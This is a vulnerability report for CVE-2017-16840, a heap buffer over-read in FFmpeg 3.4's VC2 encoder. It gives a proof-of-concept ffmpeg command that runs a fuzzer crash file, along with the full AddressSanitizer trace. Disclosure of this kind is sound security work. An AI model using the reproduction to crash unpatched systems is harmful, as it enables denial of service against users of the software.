#CVE-2017-16840
# heap-based buffer over-read and application crash in FFmpeg 3.4 (CVE-2017-16840)

## Product Download: http://ffmpeg.org/

## Vulnerability Typeï¼šheap-based buffer

## Attack Type : local

## Vulnerability Description
FFmpeg 3.4 cause a denial of service (heap-based buffer over-read and application crash) via a crafted file

## POC
./ffmpeg_g -y -i ../../../Fuzzers/ffmpeg_fuzzer/crashes/heap-buffer-overflow-1510721870.65-decoder-dirac-test.264 -f dirac /dev/null
ffmpeg version 3.4 Copyright (c) 2000-2017 the FFmpeg developers
  built with clang version 5.0.0 (tags/RELEASE_500/final)
  configuration: --cc=clang --extra-cflags='-g -fsanitize=address -fsanitize-coverage=trace-pc-guard' --extra-ldflags='-g -fsanitize=address -fsanitize-coverage=trace-pc-guard' --enable-debug --disable-x86asm
  libavutil      55. 78.100 / 55. 78.100
  libavcodec     57.107.100 / 57.107.100
  libavformat    57. 83.100 / 57. 83.100
  libavdevice    57. 10.100 / 57. 10.100
  libavfilter     6.107.100 /  6.107.100
  libswscale      4.  8.100 /  4.  8.100
  libswresample   2.  9.100 /  2.  9.100
[h264 @ 0x61a000000680] Invalid level prefix
[h264 @ 0x61a000000680] error while decoding MB 5 1
[h264 @ 0x61a000000680] concealing 40 DC, 40 AC, 40 MV errors in I frame
[h264 @ 0x61a000000680] corrupted macroblock 3 2 (total_coeff=16)
[h264 @ 0x61a000000680] error while decoding MB 3 2
[h264 @ 0x61a000000680] concealing 40 DC, 40 AC, 40 MV errors in P frame
[h264 @ 0x61b000000080] decoding for stream 0 failed
Input #0, h264, from '../../../Fuzzers/ffmpeg_fuzzer/crashes/heap-buffer-overflow-1510721870.65-decoder-dirac-test.264':
  Duration: N/A, bitrate: N/A
    Stream #0:0: Video: h264 (Baseline), yuv420p(progressive), 150x64, 25 fps, 25 tbr, 1200k tbn, 50 tbc
Stream mapping:
  Stream #0:0 -> #0:0 (h264 (native) -> dirac (vc2))
Press [q] to stop, [?] for help
[h264 @ 0x61a000003c80] Invalid level prefix
[h264 @ 0x61a000003c80] error while decoding MB 5 1
[h264 @ 0x61a000003c80] concealing 40 DC, 40 AC, 40 MV errors in I frame
[h264 @ 0x61a000004880] corrupted macroblock 3 2 (total_coeff=16)
[h264 @ 0x61a000004880] error while decoding MB 3 2
[h264 @ 0x61a000004880] concealing 40 DC, 40 AC, 40 MV errors in P frame
[vc2 @ 0x61a000003680] Format does not strictly comply with VC2 specs
Output #0, dirac, to '/dev/null':
  Metadata:
    encoder         : Lavf57.83.100
    Stream #0:0: Video: dirac (vc2), yuv420p, 150x64, q=2-31, 600000 kb/s, 25 fps, 25 tbn, 25 tbc
    Metadata:
      encoder         : Lavc57.107.100 vc2
=================================================================
==8583==AddressSanitizer: while reporting a bug found another one. Ignoring.
==8583==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x62b0000001b0 at pc 0x0000021c99dd bp 0x7fd691e29c20 sp 0x7fd691e29c18
READ of size 16 at 0x62b0000001b0 thread T18
/usr/local/bin/llvm-symbolizer: /lib/x86_64-linux-gnu/libtinfo.so.5: no version information available (required by /usr/local/bin/llvm-symbolizer)
    #0 0x21c99dc in vc2_subband_dwt_97 /home/zzt/Fuzzing/Victims/ASAN/ffmpeg-3.4/libavcodec/vc2enc_dwt.c:118:53
    #1 0x21c215b in dwt_plane /home/zzt/Fuzzing/Victims/ASAN/ffmpeg-3.4/libavcodec/vc2enc.c:932:9
    #2 0x1c53a72 in worker_func /home/zzt/Fuzzing/Victims/ASAN/ffmpeg-3.4/libavcodec/pthread_slice.c:71:21
    #3 0x35ae707 in run_jobs /home/zzt/Fuzzing/Victims/ASAN/ffmpeg-3.4/libavutil/slicethread.c:61:9
    #4 0x35ae707 in thread_worker /home/zzt/Fuzzing/Victims/ASAN/ffmpeg-3.4/libavutil/slicethread.c:85
    #5 0x7fd69e5196a9 in start_thread /build/glibc-qbmteM/glibc-2.21/nptl/pthread_create.c:333
    #6 0x7fd69dc2c13c in clone /build/glibc-qbmteM/glibc-2.21/misc/../sysdeps/unix/sysv/linux/x86_64/clone.S:109

0x62b0000001b0 is located 80 bytes to the left of 24576-byte region [0x62b000000200,0x62b000006200)
allocated by thread T0 here:
    #0 0x4be79e in __interceptor_posix_memalign /home/brian/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:148:3
    #1 0x357656a in av_malloc /home/zzt/Fuzzing/Victims/ASAN/ffmpeg-3.4/libavutil/mem.c:87:9
    #2 0x21c5b6f in ff_vc2enc_init_transforms /home/zzt/Fuzzing/Victims/ASAN/ffmpeg-3.4/libavcodec/vc2enc_dwt.c:265:17

Thread T18 created by T0 here:
    #0 0x4a6e0d in __interceptor_pthread_create /home/brian/final/llvm.src/projects/compiler-rt/lib/asan/asan_interceptors.cc:317:3
    #1 0x35ae297 in avpriv_slicethread_create /home/zzt/Fuzzing/Victims/ASAN/ffmpeg-3.4/libavutil/slicethread.c:151:19

SUMMARY: AddressSanitizer: heap-buffer-overflow /home/zzt/Fuzzing/Victims/ASAN/ffmpeg-3.4/libavcodec/vc2enc_dwt.c:118:53 in vc2_subband_dwt_97
Shadow bytes around the buggy address:
  0x0c567fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c567fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c567fff8000: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c567fff8010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c567fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x0c567fff8030: fa fa fa fa fa fa[fa]fa fa fa fa fa fa fa fa fa
  0x0c567fff8040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c567fff8050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c567fff8060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c567fff8070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c567fff8080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==8583==ABORTING

## Versions:FFmpeg 3.4

## Impact:Denial of Service

## Credit

## References

CVE: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16840